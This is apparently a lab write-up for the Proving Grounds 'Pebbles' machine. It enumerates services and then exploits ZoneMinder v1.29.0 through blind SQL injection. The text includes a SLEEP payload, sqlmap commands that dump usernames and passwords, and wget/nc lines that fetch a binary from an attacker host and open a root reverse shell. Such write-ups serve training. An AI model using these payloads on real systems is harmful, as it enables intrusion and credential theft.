---
description: Writeup for Pebbles from Offensive Security Proving Grounds (PG)
---

# Pebbles

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.85.52 -t full`

`nmapAutomator.sh -H 192.168.85.52 -t vulns`

![](../../.gitbook/assets/48d97856a5ef43529a5005a82d551226.png)

### HTTP

Port 80

![](../../.gitbook/assets/80f84f8f57074fad9dc2c2947cf163aa.png)

`gobuster dir -u http://192.168.85.52 -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50`

![](../../.gitbook/assets/98b508bc3513474f9551fd3d8ba51dca.png)

Using a larger wordlist:

`gobuster dir -u http://192.168.85.52 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -x .txt,.php --threads 100`

![](../../.gitbook/assets/6bed5bc2ca774815acb95de65006c457.png)

We have a ZoneMinder console \(v1.29.0\).

![](../../.gitbook/assets/ac06be358d81452596baff86d11f8300.png)

Port 8080 contains another HTTP service.

`gobuster dir -u http://192.168.85.52:8080 -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 50`

![](../../.gitbook/assets/47a90d5dbb324e9c80cad5026bbf975f.png)

There is a `hello.php`.

![](../../.gitbook/assets/c769faeb21b0474384c91eabb8f7b6bc.png)

## Exploitation

From the ZoneMinder version \(v1.29.0\) above, we find that it is vulnerable to SQL injection.

[https://www.exploit-db.com/exploits/41239](https://www.exploit-db.com/exploits/41239)

It appears that the `limit` parameter is vulnerable to stacked queries. Using the following POST payload:

`view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5`

We can make the server sleep for 5 seconds.

![](../../.gitbook/assets/c964409c24e74e04a20dd3d2f610147b.png)

This is a blind SQL injection \(True = sleep, False = no sleep\).

We can automate the blind SQL injection using `sqlmap`.

`sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm --tables --threads 5`

![](../../.gitbook/assets/3eecdd45a2704cddaaa5fdb4dc863094.png)

`sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm -T Users -C Username,Password --dump --threads 5`

![](../../.gitbook/assets/db401a0a624748cfb5e3a09da1caded7.png)

We can achieve RCE using the `--os-shell` option.

`sqlmap http://192.168.133.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell`

![](../../.gitbook/assets/0b50a04b17b94ea797c059370605c084.png)

```text
wget "http://192.168.49.133/nc" -O /tmp/nc
chmod +x /tmp/nc
/tmp/nc -e /bin/bash 192.168.49.133 3305
```

**Two things were important here: the port 3305, and the location of the nc binary.**

On our listening machine, we get a root shell.

![](../../.gitbook/assets/72e0d008acfc43e79d022509fea3aaa0.png)

Upgrade to an interactive shell: `python -c 'import pty;pty.spawn("/bin/bash")'`

Proof:

![](../../.gitbook/assets/86b04a6d492b4824bb14e8e7c57119d5.png)

